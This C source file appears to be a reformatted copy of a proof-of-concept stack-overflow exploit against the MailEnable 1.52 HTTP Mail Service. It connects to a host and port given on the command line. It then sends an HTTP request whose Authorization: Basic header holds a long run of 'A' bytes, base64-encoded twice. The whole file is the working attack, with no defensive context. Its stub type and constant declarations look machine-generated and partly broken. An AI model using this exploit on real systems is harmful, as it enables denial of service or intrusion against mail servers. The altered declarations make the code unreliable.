
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef char uint8_t ;
typedef int uint16_t ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int peer ;
typedef int path ;
typedef int WSADATA ;


 int AF_INET ;
 int BOF1SZ ;
 int BUFFSZ ;
 int IPPROTO_TCP ;
 int MAKEWORD (int,int ) ;
 int Menuu (int,char**) ;
 int SOCK_STREAM ;
 int WSAStartup (int ,int *) ;
 int args (int,char**) ;
 int atoi (char*) ;
 char* base64_encode (char*,int*) ;
 int close (int) ;
 scalar_t__ connect (int,struct sockaddr*,int) ;
 int doit (int,char**) ;
 int exit (int) ;
 int fletcher32 (char*,int) ;
 int fputs (char*,int ) ;
 int get_executable_path (char*,int) ;
 int htons (int ) ;
 char* inet_ntoa (TYPE_1__) ;
 int ntohs (int ) ;
 int printf (char*,...) ;
 int putcc (char*,char,int) ;
 int recv (int,char*,int,int ) ;
 int resolv (char*) ;
 int send (int,char*,int,int ) ;
 int setbuf (int ,int *) ;
 int socket (int ,int ,int ) ;
 int sprintf (char*,char*,char*) ;
 int stdout ;
 int timeout (int,int) ;

int main(int argc, char *argv[]) {
    char path[1000];
    struct sockaddr_in peer;
    int sd,
           len,
           attack;
    uint16_t port;
    uint8_t buff[BUFFSZ],
           *b64;
    int a;
    printf("*******************************************************************************\n");
    printf("MailEnable 1.52 HTTP Mail Service Stack Overflow POC Exploit(encoded comand)\n");
    printf("\tCredits:fl0 fl0w\n");
    Menuu(argc, argv);
    printf("*******************************************************************************\n");
    a = doit(argc, argv);




    setbuf(stdout, ((void*)0));
    fputs("\n"
        "\n", stdout);
    if(argc < 3) {
        printf("\n"
        "Usage: %s option host option port\n"
        "\n", argv[0]);
        exit(1);
    }
    args(argc, argv);
    if(argc > 3) port = atoi(argv[4]);
    get_executable_path (path, sizeof (path));
    printf ("this program is in the directory %s\n", path);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port = htons(port);
    peer.sin_family = AF_INET;
    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) exit(0);
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))< 0) exit(0);
    len = BOF1SZ;
    putcc(buff, 'A', len);
    b64 = base64_encode(buff, &len);
    b64 = base64_encode(b64, &len);
    len = sprintf(buff,"GET / HTTP/1.0\r\n""Authorization: Basic %s\r\n""\r\n", b64);
    fletcher32(buff,len);
    send(sd, buff, len, 0);
    if(!timeout(sd, 5)) recv(sd, buff, BUFFSZ, 0);
    close(sd);
    printf("- done\n");
    return(0);
    }
